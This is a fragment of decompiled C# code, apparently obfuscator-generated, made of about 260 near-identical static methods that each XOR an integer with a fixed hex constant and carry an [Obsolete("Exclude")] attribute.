	[Obsolete("Exclude")]
	public static int smethod_1783(int int_4)
	{
		return int_4 ^ 0x16ECC8D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1784(int int_4)
	{
		return int_4 ^ 0x633425F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1785(int int_4)
	{
		return int_4 ^ 0x5D42B38A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1786(int int_4)
	{
		return int_4 ^ 0x4151AAA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1787(int int_4)
	{
		return int_4 ^ 0x6F9417F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1788(int int_4)
	{
		return int_4 ^ 0x57C65AEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1789(int int_4)
	{
		return int_4 ^ 0x612256DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1790(int int_4)
	{
		return int_4 ^ 0x5E62D2FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1791(int int_4)
	{
		return int_4 ^ 0x4AC192E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1792(int int_4)
	{
		return int_4 ^ 0x6007615F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1793(int int_4)
	{
		return int_4 ^ 0x2C25E27C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1794(int int_4)
	{
		return int_4 ^ 0x452359BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1795(int int_4)
	{
		return int_4 ^ 0x6A08D391;
	}

	[Obsolete("Exclude")]
	public static int smethod_1796(int int_4)
	{
		return int_4 ^ 0x74AFA6D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1797(int int_4)
	{
		return int_4 ^ 0x1A5A7BAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1798(int int_4)
	{
		return int_4 ^ 0x397AF37E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1799(int int_4)
	{
		return int_4 ^ 0x748153E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1800(int int_4)
	{
		return int_4 ^ 0x6E2BDDCE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1801(int int_4)
	{
		return int_4 ^ 0x454E92B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1802(int int_4)
	{
		return int_4 ^ 0x73323B15;
	}

	[Obsolete("Exclude")]
	public static int smethod_1803(int int_4)
	{
		return int_4 ^ 0x56F643A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1804(int int_4)
	{
		return int_4 ^ 0x53FFE99E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1805(int int_4)
	{
		return int_4 ^ 0x3F9AE298;
	}

	[Obsolete("Exclude")]
	public static int smethod_1806(int int_4)
	{
		return int_4 ^ 0x663777D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1807(int int_4)
	{
		return int_4 ^ 0x4CF5D012;
	}

	[Obsolete("Exclude")]
	public static int smethod_1808(int int_4)
	{
		return int_4 ^ 0x17859FEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1809(int int_4)
	{
		return int_4 ^ 0x18E6742C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1810(int int_4)
	{
		return int_4 ^ 0x64B1ABE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1811(int int_4)
	{
		return int_4 ^ 0xB483DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1812(int int_4)
	{
		return int_4 ^ 0x41EF8A46;
	}

	[Obsolete("Exclude")]
	public static int smethod_1813(int int_4)
	{
		return int_4 ^ 0x1E491C11;
	}

	[Obsolete("Exclude")]
	public static int smethod_1814(int int_4)
	{
		return int_4 ^ 0x1EC8BD93;
	}

	[Obsolete("Exclude")]
	public static int smethod_1815(int int_4)
	{
		return int_4 ^ 0x1B02B216;
	}

	[Obsolete("Exclude")]
	public static int smethod_1816(int int_4)
	{
		return int_4 ^ 0x2E3C591B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1817(int int_4)
	{
		return int_4 ^ 0x5D67C757;
	}

	[Obsolete("Exclude")]
	public static int smethod_1818(int int_4)
	{
		return int_4 ^ 0x659957F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1819(int int_4)
	{
		return int_4 ^ 0x62A0B623;
	}

	[Obsolete("Exclude")]
	public static int smethod_1820(int int_4)
	{
		return int_4 ^ 0x698F7C59;
	}

	[Obsolete("Exclude")]
	public static int smethod_1821(int int_4)
	{
		return int_4 ^ 0x2B618394;
	}

	[Obsolete("Exclude")]
	public static int smethod_1822(int int_4)
	{
		return int_4 ^ 0x2ABD8914;
	}

	[Obsolete("Exclude")]
	public static int smethod_1823(int int_4)
	{
		return int_4 ^ 0x51A5D455;
	}

	[Obsolete("Exclude")]
	public static int smethod_1824(int int_4)
	{
		return int_4 ^ 0x5CBA6F54;
	}

	[Obsolete("Exclude")]
	public static int smethod_1825(int int_4)
	{
		return int_4 ^ 0x6CC9ED35;
	}

	[Obsolete("Exclude")]
	public static int smethod_1826(int int_4)
	{
		return int_4 ^ 0x38F71D5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1827(int int_4)
	{
		return int_4 ^ 0x56152C14;
	}

	[Obsolete("Exclude")]
	public static int smethod_1828(int int_4)
	{
		return int_4 ^ 0x7CDF8800;
	}

	[Obsolete("Exclude")]
	public static int smethod_1829(int int_4)
	{
		return int_4 ^ 0x2976B4A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1830(int int_4)
	{
		return int_4 ^ 0x3C8080B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1831(int int_4)
	{
		return int_4 ^ 0x5D6A172;
	}

	[Obsolete("Exclude")]
	public static int smethod_1832(int int_4)
	{
		return int_4 ^ 0x3DD6A5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1833(int int_4)
	{
		return int_4 ^ 0x6B4BDB2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1834(int int_4)
	{
		return int_4 ^ 0x76DC634B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1835(int int_4)
	{
		return int_4 ^ 0x5AA373D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1836(int int_4)
	{
		return int_4 ^ 0x7E1BF650;
	}

	[Obsolete("Exclude")]
	public static int smethod_1837(int int_4)
	{
		return int_4 ^ 0x5DFB8E05;
	}

	[Obsolete("Exclude")]
	public static int smethod_1838(int int_4)
	{
		return int_4 ^ 0x3ACE4F1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1839(int int_4)
	{
		return int_4 ^ 0x23EDBF2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1840(int int_4)
	{
		return int_4 ^ 0xCCD6D90;
	}

	[Obsolete("Exclude")]
	public static int smethod_1841(int int_4)
	{
		return int_4 ^ 0x4CA03DF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1842(int int_4)
	{
		return int_4 ^ 0x67B63C33;
	}

	[Obsolete("Exclude")]
	public static int smethod_1843(int int_4)
	{
		return int_4 ^ 0x4DA0729F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1844(int int_4)
	{
		return int_4 ^ 0x3721FE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1845(int int_4)
	{
		return int_4 ^ 0x15BB635;
	}

	[Obsolete("Exclude")]
	public static int smethod_1846(int int_4)
	{
		return int_4 ^ 0x25AAA20E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1847(int int_4)
	{
		return int_4 ^ 0x10BC7464;
	}

	[Obsolete("Exclude")]
	public static int smethod_1848(int int_4)
	{
		return int_4 ^ 0x403C455C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1849(int int_4)
	{
		return int_4 ^ 0x58993E48;
	}

	[Obsolete("Exclude")]
	public static int smethod_1850(int int_4)
	{
		return int_4 ^ 0x25544D5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1851(int int_4)
	{
		return int_4 ^ 0x3B3B4780;
	}

	[Obsolete("Exclude")]
	public static int smethod_1852(int int_4)
	{
		return int_4 ^ 0x726F52D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_1853(int int_4)
	{
		return int_4 ^ 0x5A46BB6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1854(int int_4)
	{
		return int_4 ^ 0x4CAAE1BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1855(int int_4)
	{
		return int_4 ^ 0x5F315ADA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1856(int int_4)
	{
		return int_4 ^ 0x24495785;
	}

	[Obsolete("Exclude")]
	public static int smethod_1857(int int_4)
	{
		return int_4 ^ 0x3D3429B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1858(int int_4)
	{
		return int_4 ^ 0x4F97D169;
	}

	[Obsolete("Exclude")]
	public static int smethod_1859(int int_4)
	{
		return int_4 ^ 0x45573E5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1860(int int_4)
	{
		return int_4 ^ 0x403B3154;
	}

	[Obsolete("Exclude")]
	public static int smethod_1861(int int_4)
	{
		return int_4 ^ 0x148253A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1862(int int_4)
	{
		return int_4 ^ 0x4FD71182;
	}

	[Obsolete("Exclude")]
	public static int smethod_1863(int int_4)
	{
		return int_4 ^ 0x14E45BB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1864(int int_4)
	{
		return int_4 ^ 0x1483E063;
	}

	[Obsolete("Exclude")]
	public static int smethod_1865(int int_4)
	{
		return int_4 ^ 0x6170DE78;
	}

	[Obsolete("Exclude")]
	public static int smethod_1866(int int_4)
	{
		return int_4 ^ 0x1A3C2E86;
	}

	[Obsolete("Exclude")]
	public static int smethod_1867(int int_4)
	{
		return int_4 ^ 0x6C1008FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1868(int int_4)
	{
		return int_4 ^ 0x4F3A2AB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1869(int int_4)
	{
		return int_4 ^ 0x122A79F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1870(int int_4)
	{
		return int_4 ^ 0x70DAC8E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1871(int int_4)
	{
		return int_4 ^ 0x500DB8D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1872(int int_4)
	{
		return int_4 ^ 0x77F047F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1873(int int_4)
	{
		return int_4 ^ 0x6C2B9F69;
	}

	[Obsolete("Exclude")]
	public static int smethod_1874(int int_4)
	{
		return int_4 ^ 0x7689517E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1875(int int_4)
	{
		return int_4 ^ 0x7EB63193;
	}

	[Obsolete("Exclude")]
	public static int smethod_1876(int int_4)
	{
		return int_4 ^ 0x135AC6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1877(int int_4)
	{
		return int_4 ^ 0xBB8D472;
	}

	[Obsolete("Exclude")]
	public static int smethod_1878(int int_4)
	{
		return int_4 ^ 0x26345930;
	}

	[Obsolete("Exclude")]
	public static int smethod_1879(int int_4)
	{
		return int_4 ^ 0x559A3700;
	}

	[Obsolete("Exclude")]
	public static int smethod_1880(int int_4)
	{
		return int_4 ^ 0x1759AD7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1881(int int_4)
	{
		return int_4 ^ 0x2C09E9A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1882(int int_4)
	{
		return int_4 ^ 0x2AC69ECF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1883(int int_4)
	{
		return int_4 ^ 0x2DA8A8E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1884(int int_4)
	{
		return int_4 ^ 0x1D5A476B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1885(int int_4)
	{
		return int_4 ^ 0x62C821F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1886(int int_4)
	{
		return int_4 ^ 0x41C5C301;
	}

	[Obsolete("Exclude")]
	public static int smethod_1887(int int_4)
	{
		return int_4 ^ 0x5C51FC72;
	}

	[Obsolete("Exclude")]
	public static int smethod_1888(int int_4)
	{
		return int_4 ^ 0x7034A91F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1889(int int_4)
	{
		return int_4 ^ 0x4147D1C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1890(int int_4)
	{
		return int_4 ^ 0x56AD6BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1891(int int_4)
	{
		return int_4 ^ 0xFE1509A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1892(int int_4)
	{
		return int_4 ^ 0x38D3C266;
	}

	[Obsolete("Exclude")]
	public static int smethod_1893(int int_4)
	{
		return int_4 ^ 0x44FE8D61;
	}

	[Obsolete("Exclude")]
	public static int smethod_1894(int int_4)
	{
		return int_4 ^ 0x75B43A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1895(int int_4)
	{
		return int_4 ^ 0x1B5D9870;
	}

	[Obsolete("Exclude")]
	public static int smethod_1896(int int_4)
	{
		return int_4 ^ 0x1130FE7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1897(int int_4)
	{
		return int_4 ^ 0x7C588F8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1898(int int_4)
	{
		return int_4 ^ 0x79F3978F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1899(int int_4)
	{
		return int_4 ^ 0xC36AF79;
	}

	[Obsolete("Exclude")]
	public static int smethod_1900(int int_4)
	{
		return int_4 ^ 0x304F31ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_1901(int int_4)
	{
		return int_4 ^ 0x32030E16;
	}

	[Obsolete("Exclude")]
	public static int smethod_1902(int int_4)
	{
		return int_4 ^ 0x6B9F6156;
	}

	[Obsolete("Exclude")]
	public static int smethod_1903(int int_4)
	{
		return int_4 ^ 0x221D0ED0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1904(int int_4)
	{
		return int_4 ^ 0x7EB152B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1905(int int_4)
	{
		return int_4 ^ 0x53FFDF92;
	}

	[Obsolete("Exclude")]
	public static int smethod_1906(int int_4)
	{
		return int_4 ^ 0x5DAF1E5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1907(int int_4)
	{
		return int_4 ^ 0x3FCCDB99;
	}

	[Obsolete("Exclude")]
	public static int smethod_1908(int int_4)
	{
		return int_4 ^ 0x34E9234E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1909(int int_4)
	{
		return int_4 ^ 0x55A39445;
	}

	[Obsolete("Exclude")]
	public static int smethod_1910(int int_4)
	{
		return int_4 ^ 0x9637C24;
	}

	[Obsolete("Exclude")]
	public static int smethod_1911(int int_4)
	{
		return int_4 ^ 0x48CEBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1912(int int_4)
	{
		return int_4 ^ 0x54D4ACF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_1913(int int_4)
	{
		return int_4 ^ 0xBA927F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1914(int int_4)
	{
		return int_4 ^ 0x285CE17E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1915(int int_4)
	{
		return int_4 ^ 0x63ED3C65;
	}

	[Obsolete("Exclude")]
	public static int smethod_1916(int int_4)
	{
		return int_4 ^ 0x2845A77D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1917(int int_4)
	{
		return int_4 ^ 0x7FE411DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1918(int int_4)
	{
		return int_4 ^ 0x4DA6CC17;
	}

	[Obsolete("Exclude")]
	public static int smethod_1919(int int_4)
	{
		return int_4 ^ 0x4825B345;
	}

	[Obsolete("Exclude")]
	public static int smethod_1920(int int_4)
	{
		return int_4 ^ 0x52277979;
	}

	[Obsolete("Exclude")]
	public static int smethod_1921(int int_4)
	{
		return int_4 ^ 0x2B088932;
	}

	[Obsolete("Exclude")]
	public static int smethod_1922(int int_4)
	{
		return int_4 ^ 0x52E9C97F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1923(int int_4)
	{
		return int_4 ^ 0x739753B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_1924(int int_4)
	{
		return int_4 ^ 0x2C4DC2AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1925(int int_4)
	{
		return int_4 ^ 0x6C2381A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1926(int int_4)
	{
		return int_4 ^ 0x3EBA142F;
	}

	[Obsolete("Exclude")]
	public static int smethod_1927(int int_4)
	{
		return int_4 ^ 0x1AE2F9EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1928(int int_4)
	{
		return int_4 ^ 0x2FC1DB7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1929(int int_4)
	{
		return int_4 ^ 0x1E449D8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1930(int int_4)
	{
		return int_4 ^ 0x47E05C4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1931(int int_4)
	{
		return int_4 ^ 0x40D328DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1932(int int_4)
	{
		return int_4 ^ 0x6D91584;
	}

	[Obsolete("Exclude")]
	public static int smethod_1933(int int_4)
	{
		return int_4 ^ 0x54E2ADAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1934(int int_4)
	{
		return int_4 ^ 0x2DBC2846;
	}

	[Obsolete("Exclude")]
	public static int smethod_1935(int int_4)
	{
		return int_4 ^ 0x1CDB551C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1936(int int_4)
	{
		return int_4 ^ 0x2665F4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1937(int int_4)
	{
		return int_4 ^ 0x11199685;
	}

	[Obsolete("Exclude")]
	public static int smethod_1938(int int_4)
	{
		return int_4 ^ 0x4B80224B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1939(int int_4)
	{
		return int_4 ^ 0x4984C1AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1940(int int_4)
	{
		return int_4 ^ 0x27BAD8C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1941(int int_4)
	{
		return int_4 ^ 0x59287A2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1942(int int_4)
	{
		return int_4 ^ 0x52AED459;
	}

	[Obsolete("Exclude")]
	public static int smethod_1943(int int_4)
	{
		return int_4 ^ 0x24AB2CE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_1944(int int_4)
	{
		return int_4 ^ 0x48CBCAAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1945(int int_4)
	{
		return int_4 ^ 0x79BD7529;
	}

	[Obsolete("Exclude")]
	public static int smethod_1946(int int_4)
	{
		return int_4 ^ 0x3AC77CDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_1947(int int_4)
	{
		return int_4 ^ 0xB7BBE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1948(int int_4)
	{
		return int_4 ^ 0x73701C83;
	}

	[Obsolete("Exclude")]
	public static int smethod_1949(int int_4)
	{
		return int_4 ^ 0x1FD0119;
	}

	[Obsolete("Exclude")]
	public static int smethod_1950(int int_4)
	{
		return int_4 ^ 0x606BFDCA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1951(int int_4)
	{
		return int_4 ^ 0x67064124;
	}

	[Obsolete("Exclude")]
	public static int smethod_1952(int int_4)
	{
		return int_4 ^ 0x1D1584EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1953(int int_4)
	{
		return int_4 ^ 0x642E5CA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_1954(int int_4)
	{
		return int_4 ^ 0x79CE23EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1955(int int_4)
	{
		return int_4 ^ 0x452117C;
	}

	[Obsolete("Exclude")]
	public static int smethod_1956(int int_4)
	{
		return int_4 ^ 0x3A1F3A5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1957(int int_4)
	{
		return int_4 ^ 0x567D0F83;
	}

	[Obsolete("Exclude")]
	public static int smethod_1958(int int_4)
	{
		return int_4 ^ 0x1AFDC6EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1959(int int_4)
	{
		return int_4 ^ 0x739DF9F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_1960(int int_4)
	{
		return int_4 ^ 0x4B830C01;
	}

	[Obsolete("Exclude")]
	public static int smethod_1961(int int_4)
	{
		return int_4 ^ 0x23132FBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_1962(int int_4)
	{
		return int_4 ^ 0x48893697;
	}

	[Obsolete("Exclude")]
	public static int smethod_1963(int int_4)
	{
		return int_4 ^ 0x66FE692A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1964(int int_4)
	{
		return int_4 ^ 0x2E7C4347;
	}

	[Obsolete("Exclude")]
	public static int smethod_1965(int int_4)
	{
		return int_4 ^ 0xBC4B6ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_1966(int int_4)
	{
		return int_4 ^ 0x1C6B08B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_1967(int int_4)
	{
		return int_4 ^ 0x1EBA431E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1968(int int_4)
	{
		return int_4 ^ 0x7FF0B57E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1969(int int_4)
	{
		return int_4 ^ 0x6AC20950;
	}

	[Obsolete("Exclude")]
	public static int smethod_1970(int int_4)
	{
		return int_4 ^ 0x18072A46;
	}

	[Obsolete("Exclude")]
	public static int smethod_1971(int int_4)
	{
		return int_4 ^ 0x2FBB269D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1972(int int_4)
	{
		return int_4 ^ 0x74DD7158;
	}

	[Obsolete("Exclude")]
	public static int smethod_1973(int int_4)
	{
		return int_4 ^ 0x3DF58273;
	}

	[Obsolete("Exclude")]
	public static int smethod_1974(int int_4)
	{
		return int_4 ^ 0x53E88CB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_1975(int int_4)
	{
		return int_4 ^ 0x6777653A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1976(int int_4)
	{
		return int_4 ^ 0x7726E196;
	}

	[Obsolete("Exclude")]
	public static int smethod_1977(int int_4)
	{
		return int_4 ^ 0xBF16A0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1978(int int_4)
	{
		return int_4 ^ 0x188711E;
	}

	[Obsolete("Exclude")]
	public static int smethod_1979(int int_4)
	{
		return int_4 ^ 0x8411B02;
	}

	[Obsolete("Exclude")]
	public static int smethod_1980(int int_4)
	{
		return int_4 ^ 0x28BB32EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_1981(int int_4)
	{
		return int_4 ^ 0x2897DAC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_1982(int int_4)
	{
		return int_4 ^ 0x44959606;
	}

	[Obsolete("Exclude")]
	public static int smethod_1983(int int_4)
	{
		return int_4 ^ 0xBA280AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_1984(int int_4)
	{
		return int_4 ^ 0x7267DE25;
	}

	[Obsolete("Exclude")]
	public static int smethod_1985(int int_4)
	{
		return int_4 ^ 0x7640723D;
	}

	[Obsolete("Exclude")]
	public static int smethod_1986(int int_4)
	{
		return int_4 ^ 0x5928907;
	}

	[Obsolete("Exclude")]
	public static int smethod_1987(int int_4)
	{
		return int_4 ^ 0x65FE647B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1988(int int_4)
	{
		return int_4 ^ 0x3FA8775A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1989(int int_4)
	{
		return int_4 ^ 0x30853D85;
	}

	[Obsolete("Exclude")]
	public static int smethod_1990(int int_4)
	{
		return int_4 ^ 0x6FE396AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_1991(int int_4)
	{
		return int_4 ^ 0x70AC1831;
	}

	[Obsolete("Exclude")]
	public static int smethod_1992(int int_4)
	{
		return int_4 ^ 0x17852368;
	}

	[Obsolete("Exclude")]
	public static int smethod_1993(int int_4)
	{
		return int_4 ^ 0x2D711B0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_1994(int int_4)
	{
		return int_4 ^ 0x69800C4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_1995(int int_4)
	{
		return int_4 ^ 0x54689E75;
	}

	[Obsolete("Exclude")]
	public static int smethod_1996(int int_4)
	{
		return int_4 ^ 0x7EAD6581;
	}

	[Obsolete("Exclude")]
	public static int smethod_1997(int int_4)
	{
		return int_4 ^ 0x6AB6DAAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_1998(int int_4)
	{
		return int_4 ^ 0x351F9B22;
	}

	[Obsolete("Exclude")]
	public static int smethod_1999(int int_4)
	{
		return int_4 ^ 0x39F1EFA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2000(int int_4)
	{
		return int_4 ^ 0x54D4B301;
	}

	[Obsolete("Exclude")]
	public static int smethod_2001(int int_4)
	{
		return int_4 ^ 0x67012174;
	}

	[Obsolete("Exclude")]
	public static int smethod_2002(int int_4)
	{
		return int_4 ^ 0x3C4CAD09;
	}

	[Obsolete("Exclude")]
	public static int smethod_2003(int int_4)
	{
		return int_4 ^ 0xDF6E19D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2004(int int_4)
	{
		return int_4 ^ 0x4A5D99BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2005(int int_4)
	{
		return int_4 ^ 0xA957F1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2006(int int_4)
	{
		return int_4 ^ 0x700BEA03;
	}

	[Obsolete("Exclude")]
	public static int smethod_2007(int int_4)
	{
		return int_4 ^ 0x360E3811;
	}

	[Obsolete("Exclude")]
	public static int smethod_2008(int int_4)
	{
		return int_4 ^ 0x2E72F70D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2009(int int_4)
	{
		return int_4 ^ 0x33C2D546;
	}

	[Obsolete("Exclude")]
	public static int smethod_2010(int int_4)
	{
		return int_4 ^ 0x6127DF01;
	}

	[Obsolete("Exclude")]
	public static int smethod_2011(int int_4)
	{
		return int_4 ^ 0x2EF63984;
	}

	[Obsolete("Exclude")]
	public static int smethod_2012(int int_4)
	{
		return int_4 ^ 0x2D054E80;
	}

	[Obsolete("Exclude")]
	public static int smethod_2013(int int_4)
	{
		return int_4 ^ 0x7404FBE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2014(int int_4)
	{
		return int_4 ^ 0x7216BD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2015(int int_4)
	{
		return int_4 ^ 0x1AEF80C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2016(int int_4)
	{
		return int_4 ^ 0x539405E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2017(int int_4)
	{
		return int_4 ^ 0x3322CE4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2018(int int_4)
	{
		return int_4 ^ 0x4D38437D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2019(int int_4)
	{
		return int_4 ^ 0x395F0A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2020(int int_4)
	{
		return int_4 ^ 0x3779B5AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2021(int int_4)
	{
		return int_4 ^ 0x121717CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2022(int int_4)
	{
		return int_4 ^ 0x53D4B46D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2023(int int_4)
	{
		return int_4 ^ 0x446CEA18;
	}

	[Obsolete("Exclude")]
	public static int smethod_2024(int int_4)
	{
		return int_4 ^ 0x47E30E03;
	}

	[Obsolete("Exclude")]
	public static int smethod_2025(int int_4)
	{
		return int_4 ^ 0x7FBB01B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2026(int int_4)
	{
		return int_4 ^ 0x4ADDDA14;
	}

	[Obsolete("Exclude")]
	public static int smethod_2027(int int_4)
	{
		return int_4 ^ 0x187CCA5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2028(int int_4)
	{
		return int_4 ^ 0x492FE6E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2029(int int_4)
	{
		return int_4 ^ 0xCB53882;
	}

	[Obsolete("Exclude")]
	public static int smethod_2030(int int_4)
	{
		return int_4 ^ 0x77C81899;
	}

	[Obsolete("Exclude")]
	public static int smethod_2031(int int_4)
	{
		return int_4 ^ 0x6615D859;
	}

	[Obsolete("Exclude")]
	public static int smethod_2032(int int_4)
	{
		return int_4 ^ 0x48D3D3CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2033(int int_4)
	{
		return int_4 ^ 0xF2928E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2034(int int_4)
	{
		return int_4 ^ 0x72646560;
	}

	[Obsolete("Exclude")]
	public static int smethod_2035(int int_4)
	{
		return int_4 ^ 0x4132B9A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2036(int int_4)
	{
		return int_4 ^ 0x23EC70B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2037(int int_4)
	{
		return int_4 ^ 0x786E16E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2038(int int_4)
	{
		return int_4 ^ 0x5A432610;
	}

	[Obsolete("Exclude")]
	public static int smethod_2039(int int_4)
	{
		return int_4 ^ 0x3686EF4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2040(int int_4)
	{
		return int_4 ^ 0x7B23A528;
	}

	[Obsolete("Exclude")]
	public static int smethod_2041(int int_4)
	{
		return int_4 ^ 0x98088F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2042(int int_4)
	{
		return int_4 ^ 0x71FD9AF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2043(int int_4)
	{
		return int_4 ^ 0x60BB807B;
	}

